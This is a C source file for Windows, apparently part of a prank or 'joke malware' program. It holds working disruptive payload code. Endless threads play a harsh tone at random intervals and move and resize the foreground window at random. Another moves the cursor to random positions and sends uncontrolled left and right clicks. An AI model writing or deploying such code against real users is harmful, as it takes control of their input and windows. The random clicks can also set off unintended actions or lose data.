#include "0x5a.h"

BOOL WINAPI BeepEx(VOID) {
	SHORT sBuffer[4410];

	for (INT i = 0; i < 4410; i++) {
		sBuffer[i] = (SHORT)(tanf(i * 2.0f * 3.14159f * 440.0f / 44100.0f) * 3000);
	}

	HWAVEOUT hWaveout;
	WAVEFORMATEX wFmt = { WAVE_FORMAT_PCM, 1, 44100, 41200, 2, 16, 0 };
	waveOutOpen(&hWaveout, WAVE_MAPPER, &wFmt, 0, 0, 0);

	WAVEHDR wHdr = { (LPSTR)sBuffer, sizeof(sBuffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveout, &wHdr, sizeof(wHdr));
	waveOutWrite(hWaveout, &wHdr, sizeof(wHdr));

	while (!(wHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}

	waveOutUnprepareHeader(hWaveout, &wHdr, sizeof(wHdr));
	waveOutClose(hWaveout);

	return TRUE;
}

DWORD WINAPI AnnoyingSound(LPVOID lpDwordVoid) {
	while (TRUE) {
		Sleep(rand() % 2000);
		CloseHandle(CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)BeepEx, NULL, 0, NULL));
		Sleep(1000);
	}
	return TRUE;
}

DWORD WINAPI MoveWindowThread(LPVOID lpWindowThread) {
	CONST INT screenWidth = GetSystemMetrics(SM_CXSCREEN);
	CONST INT screenHeight = GetSystemMetrics(SM_CYSCREEN);
	while (TRUE) {
		HWND hWindow = GetForegroundWindow();
		MoveWindow(hWindow, rand() % screenWidth, rand() % screenHeight, rand() % screenWidth, rand() % screenHeight, FALSE);
		Sleep(rand() % 2000);
	}
	return 0x00;
}

DWORD WINAPI CursorMoveThread(LPVOID lpCursorThread) {
	CONST INT screenWidth = GetSystemMetrics(SM_CXSCREEN);
	CONST INT screenHeight = GetSystemMetrics(SM_CYSCREEN);
	while (TRUE) {
		INT nX = rand() % screenWidth;
		INT nY = rand() % screenHeight;
		SetCursorPos(nX, nY);
		mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
		mouse_event(MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
		Sleep(rand() % 7000);
	}
	return 0x00;
}